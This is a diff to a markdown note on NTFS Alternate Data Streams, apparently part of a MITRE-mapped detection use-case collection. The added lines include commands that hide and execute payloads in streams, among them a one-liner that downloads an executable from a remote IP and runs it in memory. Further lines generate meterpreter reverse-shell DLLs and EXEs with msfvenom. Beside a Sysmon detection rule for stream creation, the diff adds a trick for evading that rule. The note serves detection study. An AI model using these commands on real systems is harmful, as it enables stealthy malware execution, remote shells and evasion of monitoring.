@@ -43,12 +43,12 @@ notepad.exe file.txt:Zone.Identifier
 
 
 
-to create ADS
+**to create ADS**
 
 ```powershell
 set-content -Path {path to the file} - Stream {name of the stream} -Value {Value}
 ```
-
+to remove ADS
 ```powershell
 Remove-Item –Path {path to the file} –Stream {name of the stream}
 ```
@@ -59,28 +59,128 @@ Remove-Item –Path {path to the file} –Stream {name of the stream}
 
 ADS is used a lot in malwares because it's not listed in windows explorer 
 
-to append ADS
+**Example 1**
 
 ```powershell
-echo "empty file" > c:\ADS\file.txt
-makecab c:\ADS\procexp.exe c:\ADS\procexp.cab
-extrac32 C:\ADS\procexp.cab c:\ADS\file.txt:procexp.exe
-wmic process call create '"c:\ADS\file.txt:procexp.exe"
+set-content -path ADS.txt -Stream tDS.js -Value "a = new ActiveXObject(`'Wscript.Shell`');cmd = `"powershell -ep Bypass -nop -noexit -c ([System.Reflection.Assembly]::Load((New-Object Net.WebClient).DownloadData('http://18.185.124.52/ransinvoke.exe')).EntryPoint.Invoke(`$Null,`$Null))"";a.Run(cmd,0);"
 ```
 
-in Windows vista you could start the exe in the ADS just using start command
+the above example will create ADS called tDS .js ".js is very important so we can run it"
+then for run this script
 
-in Win 10 All ADS tricks to execute executables are **batched**  
+```powershell
+wscript.exe ADS.txt:tDS.js
+```
+
+the script will download *ransinvoke.exe* from the remote server then will invoke it directly in the memory
+ransinvoke.exe is a .NET application, so it could run directly in memory using PowerShell.
+for non .net there is more complex code to run it directly in memory [for Shell code](https://github.com/rapid7/rex-powershell/blob/master/data/templates/to_mem_pshreflection.ps1.template)
 
 
+
+**Example 2**
+
+```powershell
+findstr.exe /V /L NotHere C:\Users\Noname\Desktop\Attack.js > C:\Users\Noname\Desktop\ADS.txt:Attack.js
+```
+
+to execute
+
+```powershell
+wscript.exe ADS.txt:Attack.js
+```
+
+*Note: Run findstr from cmd not PowerShell and set **full path** not relative path*
+
+
+
+**Example 3**
+
+Create dll from MSF venom
+
+```powershell
+msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4000 -f dll > /var/www/html/evil.dll
+```
+Create the ADS
+```
+type C:\Users\Noname\Desktop\Evil.dll > C:\Users\Noname\Desktop\ADS.txt:evil.dll
+```
+
+*run type from cmd not PowerShell and give it full path for the dll not relative path*
+
+Execute the ADS
+
+```powershell
+rundll32 c:\Users\Noname\Desktop\ADS.txt:shell.dll,DllMain
+```
+
+
+
+**Example 4**
+
+Create exe from MSF venom
+
+```powershell
+msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.1.4 LPORT=4000 -f exe > /var/www/html/shell.exe
+```
+
+Create ADS
+
+```powershell
+makecab c:\Users\Noname\Desktop\shell.exe c:\Users\Noname\Desktop\shell.cab
+extrac32 c:\Users\Noname\Desktop\shell.cab c:\Users\Noname\Desktop\ADS.txt:shell.exe
+```
+
+Execute the ADS
+
+```powershell
+wmic process call create "C:\Users\Noname\Desktop\ADS.txt:shell.exe"
+```
+
+of course it's not only about Metasploit, you can do this with any executable
+
+
+*you can check Link 7 for more ADS create/execute commands*
+
+ 
 
 ### ADS Monitoring
 
 Using sysmon we can monitor Adding files to streams using FileCreateStreamHash
 
+```xml
+<FileCreateStreamHash onmatch="include">
+			<TargetFilename condition="contains">Downloads</TargetFilename> 
+			<TargetFilename condition="contains">Temp\7z</TargetFilename>  
+			<TargetFilename condition="contains">Startup</TargetFilename> 
+			<TargetFilename condition="end with">.bat</TargetFilename> 
+			<TargetFilename condition="end with">.cmd</TargetFilename> 
+			<TargetFilename condition="end with">.hta</TargetFilename> 
+			<TargetFilename condition="end with">.lnk</TargetFilename> 
+			<TargetFilename condition="end with">.ps1</TargetFilename> 
+			<TargetFilename condition="end with">.ps2</TargetFilename> 
+			<TargetFilename condition="end with">.reg</TargetFilename> 
+			<TargetFilename condition="end with">.jse</TargetFilename>
+			<TargetFilename condition="end with">.vb</TargetFilename>
+			<TargetFilename condition="end with">.vbe</TargetFilename> 
+			<TargetFilename condition="end with">.vbs</TargetFilename> 
+			<TargetFilename condition="end with">.exe</TargetFilename>
+    		<TargetFilename condition="end with">.dll</TargetFilename>
+    		<TargetFilename condition="end with">.js</TargetFilename>
+		</FileCreateStreamHash>
+```
 
+*I can create ADS for executable file but without set the extension to exe and use wmic to create the process, like that I will bypass the above rule*
 
+```powershell
+makecab "c:\Users\Noname\Desktop\svchost.exe" "c:\Users\Noname\Desktop\svchost.cab"
+extrac32 "c:\Users\Noname\Desktop\svchost.cab" "c:\Users\Noname\Desktop\ADS.txt:svchost"
+wmic process call create "C:\Users\Noname\Desktop\ADS.txt:svchost"
+```
 
+![wmicProcessCreate](https://raw.githubusercontent.com/karemfaisal/SMUC---Simplified-Mitre-Use-Cases/master/ADS/Misc/wmicProcessCreate.JPG)
+
+to overcome this problem we can monitor creation for all streams and exclude Zone.Identifier and other legitimate ADS , but of course some one could name his malicious stream "Zone.Identifier"
 
 ### Reference
 
@@ -88,21 +188,29 @@ Using sysmon we can monitor Adding files to streams using FileCreateStreamHash
 
 
 
-[Link2]: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/	"Tricks to run executables in ADS"
+[Link2]: https://oddvar.moe/2018/01/14/putting-data-in-alternate-data-streams-and-how-to-execute-it/	"Tricks to run executables in ADS"
 
 
 
-[Link3]: https://www.andreafortuna.org/2017/10/11/some-thoughts-about-ntfs-filesystem/	"Check ADs Part"
+[Link3]: https://oddvar.moe/2018/04/11/putting-data-in-alternate-data-streams-and-how-to-execute-it-part-2/	"Tricks to run executables in ADS Part-2"
 
 
 
-[Link4]: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/	"Explanation for ADS"
+[Link4]: https://www.andreafortuna.org/2017/10/11/some-thoughts-about-ntfs-filesystem/	"Check ADs Part"
 
 
 
-[Link5]: https://cyberforensicator.com/2018/06/26/where-did-it-come-from-forensic-analysis-of-zone-identifier/	"Zone Identifier"
+[Link5]: https://blog.malwarebytes.com/101/2015/07/introduction-to-alternate-data-streams/	"Explanation for ADS"
 
 
 
-[Link6]: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f	"Command for creating and executing ADS"
+[Link6]: https://cyberforensicator.com/2018/06/26/where-did-it-come-from-forensic-analysis-of-zone-identifier/	"Zone Identifier"
+
+
+
+[Link7]: https://gist.github.com/api0cradle/cdd2d0d0ec9abb686f0e89306e277b8f	"a lot of Command for creating and executing ADS"
+
+
+
+[Link 8]: https://github.com/enigma0x3/Invoke-AltDSBackdoor/blob/master/Invoke-ADSBackdoor.ps1	"Run shell code through ADS"
 
